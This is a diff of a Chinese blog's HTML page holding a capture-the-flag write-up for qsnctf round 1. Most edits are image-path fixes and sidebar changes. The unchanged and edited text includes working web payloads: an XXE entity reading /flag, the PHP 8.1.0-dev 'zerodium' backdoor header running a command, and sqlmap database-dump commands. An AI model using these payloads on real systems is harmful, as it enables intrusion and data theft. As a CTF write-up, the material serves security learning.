@@ -117,12 +117,12 @@ yhuanhuan =  = 不在能知，乃在能行</title><meta name="robots" content="n
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/6zF8ewj7Zn4pJIg.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/ibKkDqfNwIytXUL.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/xjtAgruqnc43m1Q.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/AZcIyhXYgxDa36f.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/qoxySlnh7UTYwsD.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/vuBAH4kaJFtdgoC.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/pxCY3PlNUAW5GTn.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/NsekliFKc53mr67.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/oM5TSDBwfh1Oa9r.png"></li>
           <li class="item" data-background-image="https://s2.loli.net/2023/08/03/1worZdUHTMtXeP3.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/PeCrlT1WzSygfaB.png"></li>
         </ul>
       </div>
     </header>
@@ -172,7 +172,7 @@ yhuanhuan =  = 不在能知，乃在能行</title><meta name="robots" content="n
 <blockquote>
 <p>排名：3</p>
 </blockquote>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5Cimage-20240301220119039.png" alt="image-20240301220119039"></p>
+<p><img data-src="/img/qsnctf_round1/image-20240301220119039.png" alt="image-20240301220119039"></p>
 <h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> CRYPTO</h2>
 <h3 id="四重加密"><a class="markdownIt-Anchor" href="#四重加密">#</a> 四重加密</h3>
 <p>压缩包备注</p>
@@ -226,7 +226,7 @@ yhuanhuan =  = 不在能知，乃在能行</title><meta name="robots" content="n
 <figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>input_filename <span class="token operator">=</span> <span class="token string">'1.txt'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>output_filename <span class="token operator">=</span> <span class="token string">'output_filename.zip'</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>input_filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    hex_data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>binary_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">for</span> <span class="token keyword">match</span> <span class="token keyword">in</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'([0-9a-fA-F]&#123;2&#125;(?: [0-9a-fA-F]&#123;2&#125;)+)'</span><span class="token punctuation">,</span> hex_data<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    binary_data<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> binary_file<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    binary_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>binary_data<span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到的文件是一个进行逆置的压缩包形式</p>
 <p>可以使用 puzzlesolve 解决了</p>
 <p>得到里面有密码格式，所以去进行掩码攻击了</p>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5Cimage-20240301170538073.png" alt="image-20240301170538073"></p>
+<p><img data-src="/img/qsnctf_round1/image-20240301170538073.png" alt="image-20240301170538073"></p>
 <blockquote b414e3e3a6449ddba0997db259203eb7="">
 <p>qsnctf</p>
 </blockquote>
@@ -302,9 +302,9 @@ hint tensor([ 90., 122.,  89., 121.,  88., 120.,  65.,  97.,  66.,  98.,  67.,  
 <pre><code>提示：密码中的字符全为小写
 </code></pre>
 <p>搜  <code>JFIF</code>  发现另一个图片，formost 没把它分离出来。</p>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5Cm_1_1.png" alt="m_1_1"></p>
+<p><img data-src="/img/qsnctf_round1/m_1_1.png" alt="m_1_1"></p>
 <p>根据压缩包注释的提示，搜索  <code>AB</code>  ，高亮后可以看到密码</p>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5Cm_1_2.png" alt="m_1_2"></p>
+<p><img data-src="/img/qsnctf_round1/m_1_2.png" alt="m_1_2"></p>
 <p>抄写下来，得到</p>
 <pre><code>iamsthplay
 </code></pre>
@@ -315,7 +315,7 @@ hint tensor([ 90., 122.,  89., 121.,  88., 120.,  65.,  97.,  66.,  98.,  67.,  
 <p>发现新的压缩包里也有一个 <code>闪.jpg</code> ，明文爆破得到密码</p>
 <pre><code>G3r1ing!
 </code></pre>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5Cm_1_3.png" alt="m_1_3"></p>
+<p><img data-src="/img/qsnctf_round1/m_1_3.png" alt="m_1_3"></p>
 <p>解压后得到 flag 后半段的逆序，逆回来拼上前半段即可</p>
 <blockquote NE73R_G1V3_U1o="">
 <p>qsnctf</p>
@@ -353,18 +353,18 @@ FLAG: qsnctf</p>
 <h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> web</h2>
 <h3 id="easymd5"><a class="markdownIt-Anchor" href="#easymd5">#</a> EasyMD5</h3>
 <p>md5 强碰撞，用 <code>fastcoll</code>  生成两个 MD5 相同的 pdf 文件，上传后即可得到 flag。</p>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5Cw_1_1.png" alt="w_1_1"></p>
+<p><img data-src="/img/qsnctf_round1/w_1_1.png" alt="w_1_1"></p>
 <h3 id="php的xxe"><a class="markdownIt-Anchor" href="#php的xxe">#</a> PHP 的 XXE</h3>
 <p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYwNTM1Mi9hcnRpY2xlL2RldGFpbHMvMTE2NDk0MTEx">[Vulhub] PHP 环境 XML 外部实体注入漏洞（XXE）</span></p>
 <p>访问 <code>dom.php</code>  即可开始 xxe</p>
-<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span><span class="token punctuation">[</span><span class="token internal-subset"> </pre></td></tr><tr><td data-num="3"></td><td><pre>	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">test</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>	</pre></td></tr><tr><td data-num="4"></td><td><pre>	&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>	</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>					</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="%5Cimg%5Cqnsctf_round1%5Cw_2_1.png" alt="w_2_1"></p>
+<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span><span class="token punctuation">[</span><span class="token internal-subset"> </pre></td></tr><tr><td data-num="3"></td><td><pre>	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">test</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>	</pre></td></tr><tr><td data-num="4"></td><td><pre>	&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>	</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>					</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="/img/qsnctf_round1/w_2_1.png" alt="w_2_1"></p>
 <h3 id="php的后门"><a class="markdownIt-Anchor" href="#php的后门">#</a> PHP 的后门</h3>
 <p>原题</p>
 <p>参考链接: <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYzMjUzMDQwL2FydGljbGUvZGV0YWlscy8xMjcwMzcwMjY=">PHP/8.1.0-dev 后门命令执行漏洞复现</span></p>
 <p>http 头添加</p>
 <pre><code>User-Agentt:zerodiumsystem('cat /flag');
 </code></pre>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5Cw_3_1.png" alt="w_3_1"></p>
+<p><img data-src="/img/qsnctf_round1/w_3_1.png" alt="w_3_1"></p>
 <h3 id="easy_sqli"><a class="markdownIt-Anchor" href="#easy_sqli">#</a> Easy_SQLi</h3>
 <p>sql 盲注，简单粗暴拿 sqlmap 梭出来</p>
 <pre><code>sqlmap -r 114.txt --batch --dbs
@@ -373,7 +373,7 @@ FLAG: qsnctf</p>
 <pre><code>sqlmap -r 114.txt --batch -D qsnctf --dump
 </code></pre>
 <p>直接查看整个库，得到 flag</p>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5Cw_4_1.png" alt="w_4_1"></p>
+<p><img data-src="/img/qsnctf_round1/w_4_1.png" alt="w_4_1"></p>
 <h3 id="雏形系统"><a class="markdownIt-Anchor" href="#雏形系统">#</a> 雏形系统</h3>
 <p>有 <code>www.zip</code> 。</p>
 <p>重点代码：</p>
@@ -391,8 +391,8 @@ FLAG: qsnctf</p>
 <blockquote>
 <p>逆天 re，病毒分析，没拖进 ida 先拖到云沙箱里面分析一下，直接分析・出来了</p>
 </blockquote>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5CRE.JPG" alt="img"></p>
-<p><img data-src="%5Cimg%5Cqnsctf_round1%5C2.JPG" alt="img"></p>
+<p><img data-src="/img/qsnctf_round1/RE.JPG" alt="img"></p>
+<p><img data-src="/img/qsnctf_round1/2.JPG" alt="img"></p>
 <blockquote>
 <p>在这里就看到了 ip 和端口，</p>
 </blockquote>
@@ -413,7 +413,7 @@ FLAG: qsnctf</p>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2024-03-04 18:37:53" itemprop="dateModified" datetime="2024-03-04T18:37:53+08:00">2024-03-04</time>
+    <time title="修改时间：2024-03-04 18:42:17" itemprop="dateModified" datetime="2024-03-04T18:42:17+08:00">2024-03-04</time>
   </span>
   <span id="2024/03/04/qsnctf-round1-wp/" class="item leancloud_visitors" data-flag-title="qsnctf_round1_wp" title="阅读次数">
       <span class="icon">
@@ -579,76 +579,6 @@ FLAG: qsnctf</p>
 <div class="breadcrumb">
 <a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
 <i class="ic i-angle-right"></i>
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E7%9F%A5%E8%AF%86/" title="分类于 知识">知识</a>
-</div>
-
-    <span><a href="/2023/08/09/bins/" title="bins">bins</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
-</div>
-
-    <span><a href="/2023/09/10/sictf-wp/" title="sictf_wp">sictf_wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" title="分类于 复现">复现</a>
-</div>
-
-    <span><a href="/2023/08/02/find-flag/" title="find_flag">find_flag</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
-</div>
-
-    <span><a href="/2023/08/10/uaf/" title="uaf">uaf</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 web的学习">web的学习</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/wp/" title="分类于 wp">wp</a>
-</div>
-
-    <span><a href="/2023/08/24/web-new/" title="web_new">web_new</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
-</div>
-
-    <span><a href="/2023/08/03/srop/" title="srop">srop</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
-<i class="ic i-angle-right"></i>
 <a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" title="分类于 复现">复现</a>
 </div>
 
@@ -664,7 +594,62 @@ FLAG: qsnctf</p>
 <a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
 </div>
 
-    <span><a href="/2023/08/11/unlink/" title="unlink">unlink</a></span>
+    <span><a href="/2023/09/22/new-pwn/" title="new_pwn">new_pwn</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/02/24/The-attacker-used-an-0day/" title="The attacker used an 0day">The attacker used an 0day</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/08/13/Nep-wp/" title="Nep__wp">Nep__wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/04/b-canary/" title="b_canary">b_canary</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/03/csu/" title="csu">csu</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/10/uaf/" title="uaf">uaf</a></span>
   </li>
 
       
@@ -687,6 +672,15 @@ FLAG: qsnctf</p>
 </div>
 
     <span><a href="/2023/09/22/picture/new-pwn/" title="new_pwn">new_pwn</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/" title="技能兴鲁">技能兴鲁</a></span>
   </li>
 
   </ul>
